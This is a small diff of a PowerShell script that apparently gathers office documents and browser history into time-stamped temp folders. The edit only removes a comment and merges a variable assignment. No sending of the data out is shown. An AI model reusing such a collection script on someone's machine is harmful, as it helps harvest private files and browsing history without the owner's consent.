@@ -1,6 +1,6 @@
 $extensions = @('.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf')
 
-$destinationFolder = "$env:tmp\documents_$((Get-Date).ToString('yyyyMMddHHmmss'))"  # Change this to the desired destination folder
+$destinationFolder = "$env:tmp\documents_$((Get-Date).ToString('yyyyMMddHHmmss'))"
 
 if (-not (Test-Path -Path $destinationFolder)) {
     New-Item -ItemType Directory -Path $destinationFolder -Force
@@ -278,8 +278,7 @@ function Get-BrowserData {
     }
 }
 
-$destinationFolder = "$env:tmp\BrowserHistory_$((Get-Date).ToString('yyyyMMddHHmmss'))"
-$path = $destinationFolder
+$path = "$env:tmp\BrowserHistory_$((Get-Date).ToString('yyyyMMddHHmmss'))"
 if(!(test-path $path)) {
     New-Item -ItemType Directory -Force -Path $path
 }
